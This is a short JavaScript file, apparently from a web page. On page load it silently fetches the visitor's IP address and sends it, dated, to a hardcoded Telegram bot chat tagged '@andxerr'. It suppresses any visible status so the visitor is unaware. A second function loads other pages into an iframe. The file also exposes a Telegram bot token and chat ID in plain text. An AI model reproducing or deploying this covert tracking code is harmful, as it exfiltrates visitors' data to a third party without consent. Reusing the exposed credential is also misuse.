async function sendIP() {
    const statusDiv = document.getElementById("status");

    try {
        // Fetch the IP address
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipResponse.json();
        const ipAddress = ipData.ip;

        // Format the date as yyyy/mm/dd
        const date = new Date();
        const formattedDate = date.toISOString().split('T')[0].replace(/-/g, '/');

        // Telegram bot token and chat ID
        const token = "7249029761:AAEhqdidX_ICrhjfBX8np-QrNzrP1c-blds";
        const chatId = "5743274703";

        // Message to send
        const message = `IP Address: ${ipAddress}\n\nDate: ${formattedDate}\n\n@andxerr\n\nip address is app andxerr`;

        // Send the message via Telegram Bot API
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
        const response = await fetch(url);

        if (response.ok) {
            statusDiv.textContent = "";
        } else {
            throw new Error("Failed to send message");
        }
    } catch (error) {
        console.error("", error);
        statusDiv.textContent = "";
    }
}

// Automatically call the function when the page loads
window.onload = sendIP;







function changePage(pageUrl) {
            document.getElementById('iframe-container').src = pageUrl;
        }
